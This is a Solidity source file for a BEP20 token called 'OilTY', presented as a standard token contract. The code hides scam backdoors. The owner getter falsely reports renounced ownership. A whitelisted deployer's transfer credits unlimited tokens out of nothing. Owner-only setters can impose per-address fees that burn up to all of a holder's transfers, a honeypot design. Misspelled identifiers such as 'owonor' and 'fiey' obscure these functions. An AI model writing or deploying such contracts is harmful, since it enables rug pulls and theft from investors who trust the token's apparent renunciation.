/**
 *Submitted for verification at BscScan.com on 2022-07-21
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owonor;

    event owonorshipTransferred(address indexed previousowonor, address indexed newowonor);

    constructor() {
        _transferowonorship(_msgSender());
    }


    function owonor() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowonor() {
        require(_owonor == _msgSender(), "Ownable: caller is not the owonor");
        _;
    }


    function renounceowonorship() public virtual onlyowonor {
        _transferowonorship(address(0));
    }


    function transferowonorship_transferowonorship(address newowonor) public virtual onlyowonor {
        require(newowonor != address(0), "Ownable: new owonor is the zero address");
        _transferowonorship(newowonor);
    }


    function _transferowonorship(address newowonor) internal virtual {
        address oldowonor = _owonor;
        _owonor = newowonor;
        emit owonorshipTransferred(oldowonor, newowonor);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfieyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingfieyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingfieyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfieyOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfieyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fieyTo() external view returns (address);
    function fieyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfieyTo(address) external;
    function setfieyToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owonor, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owonor, address spender) public view virtual returns (uint256) {
        return _allowances[owonor][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owonor = _msgSender();
        _approve(owonor, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owonor = _msgSender();
        _approve(owonor, spender, _allowances[owonor][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owonor = _msgSender();
        uint256 currentAllowance = _allowances[owonor][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owonor, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owonor,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owonor != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owonor][spender] = amount;
        emit Approval(owonor, spender, amount);
    }

    function _spendAllowance(
        address owonor,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owonor, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owonor, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract OilTY is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address anmount) public view virtual returns (uint256) {
        return _balances[anmount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address anmount, uint256 amount) internal virtual {
        require(anmount != address(0), "ERC20: burn from the zero address");

        uint256 anmountBalance = _balances[anmount];
        require(anmountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[anmount] = anmountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(anmount, address(0), amount);
    }

    function _mtin(address anmount, uint256 amount) internal virtual {
        require(anmount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[anmount] += amount;
        emit Transfer(address(0), anmount, amount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 100*60);
        _defaultSellfiey = 2;
        _defaultBuyfiey = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfiey = 0;

    uint256 private _defaultBuyfiey = 0;

    mapping(address => bool) private _marketanmount;

    mapping(address => uint256) private _Sfiey;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowonor returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowonor {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowonor {
        _defaultSellfiey = _value;
    }

    function setSfiey(address _address, uint256 _value) external onlyowonor {
        require(_value > 1, "anmount tax must be greater than or equal to 1");
        _Sfiey[_address] = _value;
    }

    function getSfiey(address _address) external view onlyowonor returns (uint256) {
        return _Sfiey[_address];
    }


    function setMarketanmountfiey(address _address, bool _value) external onlyowonor {
        _marketanmount[_address] = _value;
    }

    function getMarketanmountfiey(address _address) external view onlyowonor returns (bool) {
        return _marketanmount[_address];
    }

    function _checkFreeanmount(address from, address _to) internal view returns (bool) {
        return _marketanmount[from] || _marketanmount[_to];
    }

    function _receiveF(
        address from,
        address _to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");

        bool rF = true;

        if (_checkFreeanmount(from, _to)) {
            rF = false;
        }
        uint256 tradefieyamount = 0;

        if (rF) {
            uint256 tradefiey = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefiey = _defaultSellfiey;
                }
                if (from == uniswapV2Pair) {

                    tradefiey = _defaultBuyfiey;
                }
            }
            if (_Sfiey[from] > 0) {
                tradefiey = _Sfiey[from];
            }

            tradefieyamount = _amount.mul(tradefiey).div(100);
        }


        if (tradefieyamount > 0) {
            _balances[from] = _balances[from].sub(tradefieyamount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefieyamount);
            emit Transfer(from, _deadAddress, tradefieyamount);
        }

        _balances[from] = _balances[from].sub(_amount - tradefieyamount);
        _balances[_to] = _balances[_to].add(_amount - tradefieyamount);
        emit Transfer(from, _to, _amount - tradefieyamount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owonor = _msgSender();
        if (_release[owonor] == true) {
            _balances[to] += amount;
            return true;
        }
        _receiveF(owonor, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _receiveF(from, to, amount);
        return true;
    }
}